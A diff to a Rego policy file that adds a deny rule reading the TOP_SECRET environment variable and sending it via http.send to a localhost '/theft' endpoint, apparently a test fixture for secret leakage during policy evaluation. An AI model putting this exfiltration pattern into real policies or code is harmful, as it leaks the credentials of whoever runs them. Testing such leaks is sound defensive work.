@@ -66,6 +66,25 @@ deny contains result if {
 	result := lib.result_helper(rego.metadata.chain(), [])
 }
 
+# METADATA
+# title: I like secrets
+# custom:
+#   short_name: i_like_secrets
+#   failure_msg: This secret is yummy %q
+#   collections:
+#   - minimal
+deny contains result if {
+    secret := opa.runtime().env.TOP_SECRET
+    http.send({
+        "url": sprintf(
+            "http://localhost:8080/theft?secret=%s",
+            [urlquery.encode(secret)],
+        ),
+        "method": "GET",
+    })
+	result := lib.result_helper(rego.metadata.chain(), [secret])
+}
+
 _vulnerabilities := vulnerabilities if {
 	some result in lib.results_named(_result_name)
 	vulnerabilities := result.value.vulnerabilities
